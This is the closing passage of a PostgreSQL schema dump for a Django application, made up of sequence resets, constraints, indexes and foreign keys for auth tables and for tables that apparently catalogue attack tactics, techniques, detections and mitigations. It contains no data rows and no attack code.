-- Name: django_admin_log_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.django_admin_log_id_seq', 1, true);


--
-- Name: django_content_type_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.django_content_type_id_seq', 12, true);


--
-- Name: django_migrations_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.django_migrations_id_seq', 18, true);


--
-- Name: technique_attack_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.technique_attack_id_seq', 234, true);


--
-- Name: technique_mitigation_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.technique_mitigation_id_seq', 1067, true);


--
-- Name: attacks attacks_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.attacks
    ADD CONSTRAINT attacks_pkey PRIMARY KEY (attack_id);


--
-- Name: auth_group auth_group_name_key; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_group
    ADD CONSTRAINT auth_group_name_key UNIQUE (name);


--
-- Name: auth_group_permissions auth_group_permissions_group_id_permission_id_0cd325b0_uniq; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_group_permissions
    ADD CONSTRAINT auth_group_permissions_group_id_permission_id_0cd325b0_uniq UNIQUE (group_id, permission_id);


--
-- Name: auth_group_permissions auth_group_permissions_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_group_permissions
    ADD CONSTRAINT auth_group_permissions_pkey PRIMARY KEY (id);


--
-- Name: auth_group auth_group_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_group
    ADD CONSTRAINT auth_group_pkey PRIMARY KEY (id);


--
-- Name: auth_permission auth_permission_content_type_id_codename_01ab375a_uniq; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_permission
    ADD CONSTRAINT auth_permission_content_type_id_codename_01ab375a_uniq UNIQUE (content_type_id, codename);


--
-- Name: auth_permission auth_permission_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_permission
    ADD CONSTRAINT auth_permission_pkey PRIMARY KEY (id);


--
-- Name: auth_user_groups auth_user_groups_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_user_groups
    ADD CONSTRAINT auth_user_groups_pkey PRIMARY KEY (id);


--
-- Name: auth_user_groups auth_user_groups_user_id_group_id_94350c0c_uniq; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_user_groups
    ADD CONSTRAINT auth_user_groups_user_id_group_id_94350c0c_uniq UNIQUE (user_id, group_id);


--
-- Name: auth_user auth_user_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_user
    ADD CONSTRAINT auth_user_pkey PRIMARY KEY (id);


--
-- Name: auth_user_user_permissions auth_user_user_permissions_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_user_user_permissions
    ADD CONSTRAINT auth_user_user_permissions_pkey PRIMARY KEY (id);


--
-- Name: auth_user_user_permissions auth_user_user_permissions_user_id_permission_id_14a6b632_uniq; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_user_user_permissions
    ADD CONSTRAINT auth_user_user_permissions_user_id_permission_id_14a6b632_uniq UNIQUE (user_id, permission_id);


--
-- Name: auth_user auth_user_username_key; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_user
    ADD CONSTRAINT auth_user_username_key UNIQUE (username);


--
-- Name: detection detection_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.detection
    ADD CONSTRAINT detection_pkey PRIMARY KEY (detection_id);


--
-- Name: django_admin_log django_admin_log_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.django_admin_log
    ADD CONSTRAINT django_admin_log_pkey PRIMARY KEY (id);


--
-- Name: django_content_type django_content_type_app_label_model_76bd3d3b_uniq; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.django_content_type
    ADD CONSTRAINT django_content_type_app_label_model_76bd3d3b_uniq UNIQUE (app_label, model);


--
-- Name: django_content_type django_content_type_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.django_content_type
    ADD CONSTRAINT django_content_type_pkey PRIMARY KEY (id);


--
-- Name: django_migrations django_migrations_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.django_migrations
    ADD CONSTRAINT django_migrations_pkey PRIMARY KEY (id);


--
-- Name: django_session django_session_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.django_session
    ADD CONSTRAINT django_session_pkey PRIMARY KEY (session_key);


--
-- Name: mitigation mitigates_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.mitigation
    ADD CONSTRAINT mitigates_pkey PRIMARY KEY (mitigate_id);


--
-- Name: tactic tactic_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.tactic
    ADD CONSTRAINT tactic_pkey PRIMARY KEY (tactic_id);


--
-- Name: technique_attack technique_attack_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.technique_attack
    ADD CONSTRAINT technique_attack_pkey PRIMARY KEY (id);


--
-- Name: technique_mitigation technique_mitigation_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.technique_mitigation
    ADD CONSTRAINT technique_mitigation_pkey PRIMARY KEY (id);


--
-- Name: old_techniques techniques_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.old_techniques
    ADD CONSTRAINT techniques_pkey PRIMARY KEY (technique_id, sub_technique_id);


--
-- Name: old_techniques techniques_sub_technique_id_key; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.old_techniques
    ADD CONSTRAINT techniques_sub_technique_id_key UNIQUE (sub_technique_id);


--
-- Name: technique updated_technique_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.technique
    ADD CONSTRAINT updated_technique_pkey PRIMARY KEY (combine_tech_id);


--
-- Name: auth_group_name_a6ea08ec_like; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX auth_group_name_a6ea08ec_like ON public.auth_group USING btree (name varchar_pattern_ops);


--
-- Name: auth_group_permissions_group_id_b120cbf9; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX auth_group_permissions_group_id_b120cbf9 ON public.auth_group_permissions USING btree (group_id);


--
-- Name: auth_group_permissions_permission_id_84c5c92e; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX auth_group_permissions_permission_id_84c5c92e ON public.auth_group_permissions USING btree (permission_id);


--
-- Name: auth_permission_content_type_id_2f476e4b; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX auth_permission_content_type_id_2f476e4b ON public.auth_permission USING btree (content_type_id);


--
-- Name: auth_user_groups_group_id_97559544; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX auth_user_groups_group_id_97559544 ON public.auth_user_groups USING btree (group_id);


--
-- Name: auth_user_groups_user_id_6a12ed8b; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX auth_user_groups_user_id_6a12ed8b ON public.auth_user_groups USING btree (user_id);


--
-- Name: auth_user_user_permissions_permission_id_1fbb5f2c; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX auth_user_user_permissions_permission_id_1fbb5f2c ON public.auth_user_user_permissions USING btree (permission_id);


--
-- Name: auth_user_user_permissions_user_id_a95ead1b; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX auth_user_user_permissions_user_id_a95ead1b ON public.auth_user_user_permissions USING btree (user_id);


--
-- Name: auth_user_username_6821ab7c_like; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX auth_user_username_6821ab7c_like ON public.auth_user USING btree (username varchar_pattern_ops);


--
-- Name: django_admin_log_content_type_id_c4bce8eb; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX django_admin_log_content_type_id_c4bce8eb ON public.django_admin_log USING btree (content_type_id);


--
-- Name: django_admin_log_user_id_c564eba6; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX django_admin_log_user_id_c564eba6 ON public.django_admin_log USING btree (user_id);


--
-- Name: django_session_expire_date_a5c62663; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX django_session_expire_date_a5c62663 ON public.django_session USING btree (expire_date);


--
-- Name: django_session_session_key_c0390e0f_like; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX django_session_session_key_c0390e0f_like ON public.django_session USING btree (session_key varchar_pattern_ops);


--
-- Name: auth_group_permissions auth_group_permissio_permission_id_84c5c92e_fk_auth_perm; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_group_permissions
    ADD CONSTRAINT auth_group_permissio_permission_id_84c5c92e_fk_auth_perm FOREIGN KEY (permission_id) REFERENCES public.auth_permission(id) DEFERRABLE INITIALLY DEFERRED;


--
-- Name: auth_group_permissions auth_group_permissions_group_id_b120cbf9_fk_auth_group_id; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_group_permissions
    ADD CONSTRAINT auth_group_permissions_group_id_b120cbf9_fk_auth_group_id FOREIGN KEY (group_id) REFERENCES public.auth_group(id) DEFERRABLE INITIALLY DEFERRED;


--
-- Name: auth_permission auth_permission_content_type_id_2f476e4b_fk_django_co; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_permission
    ADD CONSTRAINT auth_permission_content_type_id_2f476e4b_fk_django_co FOREIGN KEY (content_type_id) REFERENCES public.django_content_type(id) DEFERRABLE INITIALLY DEFERRED;


--
-- Name: auth_user_groups auth_user_groups_group_id_97559544_fk_auth_group_id; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_user_groups
    ADD CONSTRAINT auth_user_groups_group_id_97559544_fk_auth_group_id FOREIGN KEY (group_id) REFERENCES public.auth_group(id) DEFERRABLE INITIALLY DEFERRED;


--
-- Name: auth_user_groups auth_user_groups_user_id_6a12ed8b_fk_auth_user_id; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_user_groups
    ADD CONSTRAINT auth_user_groups_user_id_6a12ed8b_fk_auth_user_id FOREIGN KEY (user_id) REFERENCES public.auth_user(id) DEFERRABLE INITIALLY DEFERRED;


--
-- Name: auth_user_user_permissions auth_user_user_permi_permission_id_1fbb5f2c_fk_auth_perm; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_user_user_permissions
    ADD CONSTRAINT auth_user_user_permi_permission_id_1fbb5f2c_fk_auth_perm FOREIGN KEY (permission_id) REFERENCES public.auth_permission(id) DEFERRABLE INITIALLY DEFERRED;


--
-- Name: auth_user_user_permissions auth_user_user_permissions_user_id_a95ead1b_fk_auth_user_id; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_user_user_permissions
    ADD CONSTRAINT auth_user_user_permissions_user_id_a95ead1b_fk_auth_user_id FOREIGN KEY (user_id) REFERENCES public.auth_user(id) DEFERRABLE INITIALLY DEFERRED;


--
-- Name: django_admin_log django_admin_log_content_type_id_c4bce8eb_fk_django_co; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.django_admin_log
    ADD CONSTRAINT django_admin_log_content_type_id_c4bce8eb_fk_django_co FOREIGN KEY (content_type_id) REFERENCES public.django_content_type(id) DEFERRABLE INITIALLY DEFERRED;


--
-- Name: django_admin_log django_admin_log_user_id_c564eba6_fk_auth_user_id; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.django_admin_log
    ADD CONSTRAINT django_admin_log_user_id_c564eba6_fk_auth_user_id FOREIGN KEY (user_id) REFERENCES public.auth_user(id) DEFERRABLE INITIALLY DEFERRED;


--
-- Name: technique_attack technique_attack_combine_tech_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.technique_attack
    ADD CONSTRAINT technique_attack_combine_tech_id_fkey FOREIGN KEY (combine_tech_id) REFERENCES public.technique(combine_tech_id) ON UPDATE CASCADE;


--
-- Name: technique_mitigation technique_mitigation_combine_tech_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.technique_mitigation
    ADD CONSTRAINT technique_mitigation_combine_tech_id_fkey FOREIGN KEY (combine_tech_id) REFERENCES public.technique(combine_tech_id) ON UPDATE CASCADE;


--
-- Name: technique_mitigation technique_mitigation_mitigate_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.technique_mitigation
    ADD CONSTRAINT technique_mitigation_mitigate_id_fkey FOREIGN KEY (mitigate_id) REFERENCES public.mitigation(mitigate_id) ON UPDATE CASCADE;


--
-- Name: old_techniques techniques_tactic_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.old_techniques
    ADD CONSTRAINT techniques_tactic_id_fkey FOREIGN KEY (tactic_id) REFERENCES public.tactic(tactic_id) ON DELETE CASCADE;


--
-- PostgreSQL database dump complete
--

